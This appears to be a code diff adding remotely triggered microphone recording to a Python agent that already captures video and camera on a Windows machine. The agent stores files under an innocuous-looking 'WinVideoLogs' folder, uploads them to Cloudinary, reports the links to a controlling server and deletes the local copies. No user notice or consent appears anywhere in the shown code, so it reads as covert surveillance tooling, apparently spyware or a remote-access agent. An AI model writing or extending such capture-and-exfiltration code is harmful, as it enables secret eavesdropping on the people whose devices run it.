@@ -13,8 +13,16 @@ import requests
 import subprocess
 import cloudinary
 import cloudinary.uploader
+import wave
 from datetime import datetime
 import sys
+
+try:
+    import sounddevice as sd
+    sounddevice_import_error = ""
+except Exception as error:
+    sd = None
+    sounddevice_import_error = str(error)
 
 ENV_OVERRIDE_KEYS = {
     "SERVER_URL",
@@ -27,6 +35,9 @@ ENV_OVERRIDE_KEYS = {
     "AUTO_UPDATE_ENABLED",
     "UPDATE_MANIFEST_URL",
     "UPDATE_CHECK_INTERVAL_SECONDS",
+    "AUDIO_SAMPLE_RATE",
+    "AUDIO_CHANNELS",
+    "AUDIO_BLOCK_FRAMES",
 }
 
 try:
@@ -230,6 +241,20 @@ SERVER_URL = os.getenv("SERVER_URL", DEFAULT_SERVER_URL)
 RECORDING_DIR = os.path.join(os.getenv("APPDATA", os.getcwd()), "WinVideoLogs")
 FPS = 8.0
 RECONNECT_DELAY_SECONDS = 5
+try:
+    AUDIO_SAMPLE_RATE = max(8000, int(os.getenv("AUDIO_SAMPLE_RATE", "16000")))
+except ValueError:
+    AUDIO_SAMPLE_RATE = 16000
+
+try:
+    AUDIO_CHANNELS = max(1, int(os.getenv("AUDIO_CHANNELS", "1")))
+except ValueError:
+    AUDIO_CHANNELS = 1
+
+try:
+    AUDIO_BLOCK_FRAMES = max(256, int(os.getenv("AUDIO_BLOCK_FRAMES", "1024")))
+except ValueError:
+    AUDIO_BLOCK_FRAMES = 1024
 CLOUDINARY_CLOUD_NAME = os.getenv("CLOUDINARY_CLOUD_NAME")
 CLOUDINARY_API_KEY = os.getenv("CLOUDINARY_API_KEY")
 CLOUDINARY_API_SECRET = os.getenv("CLOUDINARY_API_SECRET")
@@ -272,13 +297,18 @@ else:
     if not CLOUDINARY_API_SECRET:
         missing_keys.append("CLOUDINARY_API_SECRET")
     log_error("Cloudinary credentials are not configured at startup. Missing: " + ", ".join(missing_keys))
+
+if sd is None:
+    log_error(f"sounddevice import unavailable. Voice recording disabled: {sounddevice_import_error}")
 # ---------------------
 
 sio = socketio.Client(reconnection=True, reconnection_attempts=0, reconnection_delay=2, reconnection_delay_max=10)
 is_recording = False
 is_camera_on = False
+is_voice_recording = False
 recording_lock = threading.Lock()
 camera_lock = threading.Lock()
+voice_lock = threading.Lock()
 update_lock = threading.Lock()
 update_last_checked_at = 0
 update_in_progress = False
@@ -292,6 +322,7 @@ def emit_agent_state(source=""):
         sio.emit('agent_state_update', {
             'recording': bool(is_recording),
             'cameraOn': bool(is_camera_on),
+            'voiceRecording': bool(is_voice_recording),
             'machine': MACHINE_NAME,
             'source': source,
             'timestamp': int(time.time() * 1000)
@@ -571,8 +602,8 @@ def build_playable_video_url(upload_response):
 
     return secure_url.replace(upload_marker, "/video/upload/f_mp4,vc_h264/", 1)
 
-def upload_to_cloudinary(file_path):
-    """Uploads the video and sends the URL back to the server."""
+def upload_to_cloudinary(file_path, media_type="video"):
+    """Uploads a media file and sends the URL back to the server."""
     if not CLOUDINARY_READY:
         message = "Cloudinary credentials missing. Skipping upload."
         print(message)
@@ -580,22 +611,23 @@ def upload_to_cloudinary(file_path):
         return
 
     try:
-        print(f"Uploading {file_path} to Cloudinary...")
-        log_error(f"Uploading to Cloudinary: {file_path}")
+        print(f"Uploading {media_type} {file_path} to Cloudinary...")
+        log_error(f"Uploading {media_type} to Cloudinary: {file_path}")
         response = cloudinary.uploader.upload(file_path, resource_type="video")
-        video_url = build_playable_video_url(response) or response.get("secure_url")
-        print(f"Upload Success: {video_url}")
-        log_error(f"Upload success: {video_url}")
-        
-        # Notify the backend that a new video is ready
-        sio.emit('video_upload_complete', {'url': video_url, 'machine': MACHINE_NAME})
-        
+        media_url = build_playable_video_url(response) if media_type == "video" else response.get("secure_url")
+        media_url = media_url or response.get("secure_url")
+        print(f"Upload Success ({media_type}): {media_url}")
+        log_error(f"Upload success ({media_type}): {media_url}")
+
+        event_name = 'audio_upload_complete' if media_type == "audio" else 'video_upload_complete'
+        sio.emit(event_name, {'url': media_url, 'machine': MACHINE_NAME, 'mediaType': media_type})
+
         # Cleanup local file to save space
         os.remove(file_path)
         log_error(f"Local file removed after upload: {file_path}")
     except Exception as e:
-        print(f"Cloudinary Error: {e}")
-        log_error(f"Cloudinary Error: {e}")
+        print(f"Cloudinary Error ({media_type}): {e}")
+        log_error(f"Cloudinary Error ({media_type}): {e}")
 
 def record_loop():
     global is_recording
@@ -629,9 +661,50 @@ def record_loop():
         log_error(f"Recording stopped: {file_path}")
         # Trigger upload in background
         if frames_written > 0 and os.path.exists(file_path):
-            threading.Thread(target=upload_to_cloudinary, args=(file_path,), daemon=True).start()
+            threading.Thread(target=upload_to_cloudinary, args=(file_path, 'video'), daemon=True).start()
         else:
             log_error(f"Upload skipped (frames={frames_written}, exists={os.path.exists(file_path)}): {file_path}")
+
+
+def voice_record_loop():
+    global is_voice_recording
+    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+    file_path = os.path.join(RECORDING_DIR, f"voice_{timestamp}.wav")
+    samples_written = 0
+
+    try:
+        if sd is None:
+            raise RuntimeError("sounddevice module unavailable")
+
+        with wave.open(file_path, 'wb') as wav_file:
+            wav_file.setnchannels(AUDIO_CHANNELS)
+            wav_file.setsampwidth(2)
+            wav_file.setframerate(AUDIO_SAMPLE_RATE)
+
+            with sd.InputStream(
+                samplerate=AUDIO_SAMPLE_RATE,
+                channels=AUDIO_CHANNELS,
+                dtype='int16',
+                blocksize=AUDIO_BLOCK_FRAMES
+            ) as input_stream:
+                log_error(f"Voice recording started: {file_path}")
+                while is_voice_recording:
+                    frames, overflowed = input_stream.read(AUDIO_BLOCK_FRAMES)
+                    wav_file.writeframes(frames.tobytes())
+                    samples_written += len(frames)
+                    if overflowed:
+                        log_error("Voice stream overflow detected")
+    except Exception as error:
+        log_error(f"Voice recording loop error: {error}")
+    finally:
+        is_voice_recording = False
+        emit_agent_state('voice_loop_stopped')
+        log_error(f"Voice recording stopped: {file_path}")
+
+        if samples_written > 0 and os.path.exists(file_path):
+            threading.Thread(target=upload_to_cloudinary, args=(file_path, 'audio'), daemon=True).start()
+        else:
+            log_error(f"Voice upload skipped (samples={samples_written}, exists={os.path.exists(file_path)}): {file_path}")
 
 def camera_stream_loop():
     global is_camera_on
@@ -708,6 +781,32 @@ def on_camera_stop(data=None):
     log_error("stop_camera received")
     is_camera_on = False
     emit_agent_state('stop_camera')
+
+
+@sio.on('start_voice_capture')
+def on_voice_start(data=None):
+    global is_voice_recording
+
+    if sd is None:
+        log_error("start_voice_capture blocked: sounddevice is unavailable")
+        emit_agent_state('start_voice_capture_failed')
+        return
+
+    with voice_lock:
+        if not is_voice_recording:
+            is_voice_recording = True
+            log_error("start_voice_capture received")
+            threading.Thread(target=voice_record_loop, daemon=True).start()
+
+    emit_agent_state('start_voice_capture')
+
+
+@sio.on('stop_voice_capture')
+def on_voice_stop(data=None):
+    global is_voice_recording
+    log_error("stop_voice_capture received")
+    is_voice_recording = False
+    emit_agent_state('stop_voice_capture')
 
 
 @sio.on('force_update_check')
